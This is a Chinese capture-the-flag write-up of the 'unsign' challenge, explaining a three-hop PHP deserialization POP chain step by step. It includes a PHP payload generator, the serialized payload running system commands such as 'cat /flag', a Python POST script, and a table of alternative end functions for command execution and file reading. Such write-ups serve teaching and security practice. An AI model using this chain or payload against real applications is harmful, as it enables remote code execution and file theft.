# 极客大挑战2023 · unsign Writeup

| 项 | 内容 |
|---|---|
| 赛事 | 极客大挑战 2023（第十四届）· SYC 招新赛 |
| 题目 | unsign（类名 `syc` / `lover` / `web`，所以俗称「syc 题」） |
| 考点 | 三跳 POP 链 / 魔术方法触发时机 / `echo` 断点调试 |
| flag | 待补（当时卡在属性名拼写上） |
| 状态 | 🔄 链子已推通 |
| 原始记录 | [logs/2026-10-04.md](../../logs/2026-10-04.md) |

> 相关笔记：[07 · PHP 反序列化与 POP 链](../../notes/07-PHP反序列化.md)

---

## 一句话

> 只有三个类、三跳，**第一次完全自己把链子推出来**的一题：`syc::__destruct` 把 `$cuit` 当函数调 → `lover::__invoke` 读 `$yxx->QW` → `web::__get` 落地 `$eva1($interesting)`。
> 链子本身一次就通，却在**最后一个属性名的一个字符**上栽了 —— `eva1`（数字 `1`）写成了 `eval`（字母 `l`）。

---

## 一、题目：三个类

```php
class syc   { public $cuit; }
class lover { public $yxx; public $QW; }
class web   { public $eva1; public $interesting; }   // ★ 第 4 个字符是数字 1
```

入口是 `unserialize($_POST['url'])`（POST，不是 GET），反序列化的返回值**没有人接** —— 这一点很关键，见下面「魔术方法触发时机」。

### ⭐ POP 链 = **对象图**，不是「一个对象」

一开始以为 payload 是「一个对象」。其实不是：

```
syc 对象
  └─ 属性 cuit ──▶ lover 对象        ← 第一跳
       └─ 属性 yxx ──▶ web 对象       ← 第二跳
            ├─ 属性 eva1        = "system"
            └─ 属性 interesting = 命令
```

**每一跳 = 「某个对象的某个属性里，装着下一个对象」。**

| 概念 | 作用 |
|---|---|
| **对象** | 一个 `new Xxx` 出来的实例 |
| **属性** | 对象之间的「电线」 |
| **类** | 决定这个对象**能触发哪个魔术方法** |

---

## 二、三跳链的推理过程

### 2.1 推理方法（最有用的一条）

**不要背 payload，要「读代码反推」**：

> 把那一跳的**关键那一行**抄下来，看它「读哪个 `$this->xxx`、怎么用它」，然后反推那个属性该填什么。

| 代码里的形状 | 属性该填什么 |
|---|---|
| `$x()` | 函数名字符串 / 有 `__invoke` 的对象 / callable 数组 |
| `$x->prop`（prop 不存在） | **一个对象**（且是有 `__get` 的那个类） |
| `$x($y)` | `$x` = 函数名，`$y` = 参数 |

### 2.2 三个魔术方法的触发时机

| 方法 | 什么时候**自动**触发 |
|---|---|
| `__destruct` | 对象被销毁（**`unserialize()` 返回值没人接 → 立刻销毁**） |
| `__invoke` | 对象被**当函数调用**（`$obj()`） |
| `__get` | 读一个**不存在/不可访问**的属性 |

> **这题能跑起来的关键就在这里**：`unserialize(...)` 的返回值**没有人接**，
> 拿到手就立刻被回收 → `__destruct` 自动开跑，链子自己动起来。

### 2.3 ⭐⭐ `echo` 断点法：源码自带「进度条」

这题三个魔术方法里**各有一个 echo** —— 出题人等于给了三个断点：

```php
syc::__destruct   →  echo("action!<br>");
lover::__invoke   →  echo("invoke!<br>");
web::__get        →  echo("get!<br>");
```

**每接一跳就跑一次，看输出停在哪：**

| 输出停在哪 | 说明 |
|---|---|
| 什么都没有 | `unserialize` 就失败了（payload 格式/长度错） |
| 只有 `action!` | 第一跳没接上 |
| `action!` + `invoke!` | ✅ 第一跳通，第二跳没接上 |
| 三个 echo 都有 | ✅ 前两跳通，终点没配好 |
| 三个 echo + 命令回显 | 🚩 通关 |

**这套方法以后每题都能用**：先扫源码里有哪些 echo/输出，把它们当断点。

### 2.4 `serialize()` **只导出属性，不导出方法**

实测：

```php
class syc {
    public $cuit;
    public function __destruct(){ echo "action!"; }
}
echo serialize(new syc);
// O:3:"syc":1:{s:4:"cuit";N;}      ← 方法一个字都没出现
```

**原因**：属性属于「**对象的数据**」，方法属于「**类的代码**」。
payload 只是个**类名字符串 + 属性数据**；反序列化时 PHP 拿类名去**靶机的类表**里找，方法自然就接上了。

**推论**：本地生成 payload，**类定义只需要抄属性**，不用抄方法。

### 2.5 几个语法细节

| 写法 | 说明 |
|---|---|
| `$obj->cuit->yxx = new web;` | **链式访问**：先取 `$obj->cuit`（lover 对象），再设它的 `yxx`。等价于 `$lover = $obj->cuit; $lover->yxx = ...` |
| `new web` 没括号 | 构造函数**没参数时括号可省**，等于 `new web()` |
| `serialize()` 会**递归** | 只序列化最外层对象，嵌套的对象自动跟着进去 |

---

## 三、payload 生成器

### 3.1 完整 PHP 生成器

```php
<?php
class syc   { public $cuit; }
class lover { public $yxx; public $QW; }
class web   { public $eva1; public $interesting; }   // ★ 数字 1

$obj = new syc;
$obj->cuit = new lover;                     // ① syc → lover（__destruct 里 $cuit()）
$obj->cuit->yxx = new web;                  // ② lover → web（__invoke 里 $yxx->QW）
$obj->cuit->yxx->eva1 = "system";           // ③ 终点：函数名
$obj->cuit->yxx->interesting = "cat /flag"; // ④ 终点：参数

echo serialize($obj);                       // 或 file_put_contents(__DIR__.'/payload.txt', ...)
```

**也可以写成链式（更短，输出字节级相同）**：

```php
$obj = new syc;
$obj->cuit = new lover;
$obj->cuit->yxx = new web;
$obj->cuit->yxx->eva1 = "system";
$obj->cuit->yxx->interesting = "env";
```

> 本地生成时**类定义只需要抄属性**（见 2.4），所以上面三行 `class ...` 里一个方法都没有，这是故意的。

### 3.2 三跳对照表

| 跳 | 代码位置 | 读的是 | 所以必须填 |
|---|---|---|---|
| ① | `syc::__destruct` | `$cuit()` → 当函数调 | 有 `__invoke` 的 **lover** 对象 |
| ② | `lover::__invoke` | `$this->yxx->QW` → 读属性 | 有 `__get` 且**没有 `QW` 属性**的 **web** 对象 |
| ③ | `web::__get` | `$eva1($interesting)` | `eva1`=**函数名**，`interesting`=**参数** |

**为什么第二跳只能是 web**：

| 类 | 有 `__get`？ | 有 `QW` 属性？ | 能接棒？ |
|---|---|---|---|
| `syc` | ❌ | ❌ | ❌ |
| `lover` | ❌ | ✅ 有 | ❌（读 `QW` 是正常读取，不触发魔术方法） |
| **`web`** | ✅ | ❌ | ✅ **唯一解** |

> ⭐ 反过来记：`lover` 里**必须有 `QW` 属性**才不会触发自己的 `__get`；
> 而 `web` 里**必须没有** `QW`，读它才会掉进 `__get`。**「有」和「没有」都是设计出来的。**

### 3.3 序列化串长这样（129 字节）

```
O:3:"syc":1:{
  s:4:"cuit"; O:5:"lover":2:{
    s:3:"yxx"; O:3:"web":2:{
      s:4:"eva1";        s:6:"system";
      s:11:"interesting"; s:3:"env";
    }
    s:2:"QW"; N;
  }
}
```

**代码里的 `->` 链，和序列化串的嵌套层级一一对应。**

上面为了看清楚做了缩进；**真实 payload 是一整行、无换行无空格**，就长这样（129 字节）：

```
O:3:"syc":1:{s:4:"cuit";O:5:"lover":2:{s:3:"yxx";O:3:"web":2:{s:4:"eva1";s:6:"system";s:11:"interesting";s:3:"env";}s:2:"QW";N;}}
```

> 长度会随命令变：`interesting = "env"`（3 字节）→ **129**；换成 `"cat /flag"`（9 字节）→ **135**。
> **改命令就要重新生成**，别手动改字符串 —— `s:N:"..."` 里的 `N` 对不上，`unserialize` 直接失败。

---

## 四、发送

入口是 **POST**（`$_POST['url']`），不是 GET：

```python
import requests

BASE = "http://<host>/"

payload = open("payload.txt", encoding="utf-8").read().strip()
r = requests.post(BASE, data={"url": payload})       # ★ $_POST['url']
print(r.text.split("</code>")[-1].strip())           # 砍掉 highlight_file 的源码
```

> `split("</code>")[-1]` 是这题的固定收尾：源码用 `highlight_file` 回显过一遍，
> 只看 `</code>` **之后**的部分才不会把源码误当成命令输出。

### 终点函数的替换（同一个链子，换 `eva1` 就是另一种攻击）

| 想干什么 | `eva1` | `interesting` |
|---|---|---|
| 执行命令 | `"system"` / `"passthru"` | 命令 |
| **读文件** | `"readfile"` / `"highlight_file"` | 文件路径 |
| 看配置 | `"phpinfo"` | 随便 |

---

## 五、踩坑

### 5.1 ⭐⭐ `eva1`（数字 1）vs `eval`（字母 l）

第 4 个字符之差，链子全废：

| | 靶机 | 我写的 |
|---|---|---|
| 第 4 个字符 | 数字 **`1`**（hex `31`） | 字母 **`l`**（hex `6C`） |

**为什么难发现**：

| 原因 | 说明 |
|---|---|
| 等宽字体里 `1` 和 `l` 长得几乎一样 | 肉眼看不出来 |
| **两者长度都是 4** | `s:4:"..."` 完全合法 → **`unserialize` 不报错** |
| 失败发生在**最后一步** | 前三跳全部正常（`get!` 都打出来了），只在终点炸 |
| 后果 | 值被设到一个**不存在的属性**上（PHP 允许动态属性）→ 真正的 `eva1` 还是 null → `null(...)` → `Fatal error: Function name must be a string` |

### 5.2 其余踩坑

| 问题 | 现象 | 原因 | 解决 |
|---|---|---|---|
| **`eval` 写成 `eva1`**（或反过来） | 前三个 echo 都正常，终点 `Fatal error: Function name must be a string` | 属性名第 4 个字符 数字`1` vs 字母`l`；**长度都是 4 所以不报错** | ⭐ **从靶机源码复制类定义** + **本地复现验证** |
| `yxx` 不接线 | 只看到 `action!` `invoke!`，后面空白 | `$this->yxx` 是 null → `null->QW` 只是 notice，**静默断链** | 把「接力棒」接上（`->yxx = new web`） |
| 只 `echo serialize()` | 本地看到 payload 了，靶机毫无反应 | `echo` 只是**打印**，没有发送 | 必须 **POST** 出去 |
| 本地跑不出问题 | 本地 8.2 行为可能和靶机不同 | 靶机是 PHP 7.3.4 | **以靶机实测为准** |

### ⭐ 这类「一个字符」的坑怎么防

| 方法 | 说明 |
|---|---|
| **① 类定义从靶机复制粘贴** | 别手打。整段 `class web {...}` 贴进生成器 |
| **② 本地复现验证** ⭐ | 把靶机的类**原样**抄到本地，跑一次 `unserialize`。**这是唯一能抓到「长度一样但名字不同」的方法** |
| ③ 数长度 | ❌ **这次没用**（`eval`/`eva1` 都是 4 字符） |
| ④ 换编程字体 | 用能区分 `1` `l` `I` `O` `0` 的字体 |

---

## 六、可复用方法论

### 6.1 ⭐ `echo` 断点法（本 WP 最值钱的一条）

**源码里每一个 `echo` / 输出都是一个免费断点。**

做法：

1. 先把源码里所有 `echo` / `print` / 输出现象**列出来**，标在各自的魔术方法上；
2. 每接完一跳就发一次，**看输出停在哪**；
3. 「最后打出来的那个 echo」= 已经跑通的最后一跳，**断点就在它后面那一跳**。

本题的三级进度条：

```
action!                    → ① 通了
action! invoke!            → ② 通了
action! invoke! get!       → ③ 进入终点
action! invoke! get! <回显> → 🚩 通关
```

**没有 echo 的题**：这条方法就要靠「报错位置」来判断 —— 报错发生在哪一跳，说明它前面那几跳都通了。

### 6.2 POP 链的固定读法

| 步骤 | 动作 |
|---|---|
| ① | 找**入口**：哪里 `unserialize()`，参数是 GET 还是 POST |
| ② | 找**起点魔术方法**：没人接返回值就 `__destruct`；读不存在属性就 `__get` |
| ③ | 从起点出发**逐跳抄关键行**，抄成「代码形状 → 属性填什么」表 |
| ④ | 每个候选类做**排除表**（有没有 `__get`/`__invoke`、有没有那个属性）→ 定位唯一解 |
| ⑤ | 定**终点**：`$f($arg)` 形状就是 `system`/`readfile` 这类现成函数 |
| ⑥ | 写**生成器**（类定义从靶机复制），本地 `unserialize` 自测 |
| ⑦ | **POST/GET 发出去**，用 `echo` 断点法定位断在哪 |

### 6.3 三条固定习惯

1. **类定义从靶机复制，绝不手打** —— 本次栽的就是手打。
2. **生成完先在本地 `unserialize` 跑一遍** —— 能抓属性名/长度的错。
3. **改动前先看 `echo` 停在哪** —— 别盲改 payload。

---

## 附录：一句话总结

> **三跳链：`syc::__destruct`（`$cuit()`）→ `lover::__invoke`（`$yxx->QW`）→ `web::__get`（`$eva1($interesting)`）。**
> **`serialize()` 只导出属性，所以本地类定义只需抄属性；方法在靶机那边自动接上。**
> **源码里的三个 echo 就是三个断点 —— 输出停在哪，断就在后一跳。**
> **最贵的教训：`eva1` 是数字 `1` 不是字母 `l`，两者长度都是 4，所以 `unserialize` 不会报错，只在终点 `Fatal error`。**
